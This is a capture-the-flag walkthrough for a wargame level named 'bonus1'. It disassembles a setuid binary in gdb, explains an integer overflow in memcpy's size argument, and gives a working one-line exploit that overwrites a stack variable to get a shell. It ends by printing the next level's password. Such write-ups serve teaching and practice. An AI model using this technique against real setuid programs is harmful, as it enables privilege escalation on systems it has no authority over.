```shell
$> ls -la
[...]
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
[...]

$> ./bonus1
Segmentation fault (core dumped)

$> ./bonus1 test

$> ./bonus1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

# program asks for an argument, segfaults if no argument is given
```

```shell
$> gdb -q bonus1 
(gdb) i func
[...]
0x08048424  main
[...]

# only main function is present here

(gdb) i var

# no interesting variables are defined

(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x08048438 <+20>:    call   0x8048360 <atoi@plt>                #1
    [...]
    0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9            #2
    [...]
    0x08048473 <+79>:    call   0x8048320 <memcpy@plt>              #3
    [...]
    0x08048499 <+117>:   call   0x8048350 <execl@plt>               #4
    [...]

#1: atoi converts the av[1] to an integer
#2: compares the integer to 9
#3: memcpy copies the av[2] to the stack (buff) with integer * 4 bytes
#4: execl executes /bin/sh
```

We compare the integer to 9 and to execute shell we need pass 0x574f4c46 to integer.  
We have a memcpy function that copies the av[2] to the stack (buff) with integer * 4 bytes.  
So we need use the overflow of memcpy to overwrite the integer with 0x574f4c46.  

```shell
$> python
>>> def int_ovfl(x):
...     ovfl = x & 0xffffffff
...     ovfl = ovfl - 2147483648
...     print ovfl * 4
...
>>> int_ovfl(-2147483647)
4
>>> int_ovfl(-2147483646)
8
[...]
>>> int_ovfl(-2147483637)
44

# we have here a buffer array of 40 bytes (0x3c the integer - 0x14 the buffer stack = 40)
# memcpy use the type size_t (unsigned int) on the last parameter, so we can use the negative value to overflow the integer and get a positive value
# we need 44 bytes to overwrite the integer with 0x574f4c46, because:
# stack |----|----...----|
#            0x3c        0x14
#            n           buff
# So 40 + 4 = 44, to arrive at the integer

$> ./bonus1 -2147483637 $(python -c "print '\x90' * 40 + '\x46\x4c\x4f\x57'")

# -2147483637: to pass the comparison of < 10 and get 44 bytes in memcpy
# \x90' * 40: padding of 40 bytes for the buffer
# \x46\x4c\x4f\x57': the number we want to overwrite

$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
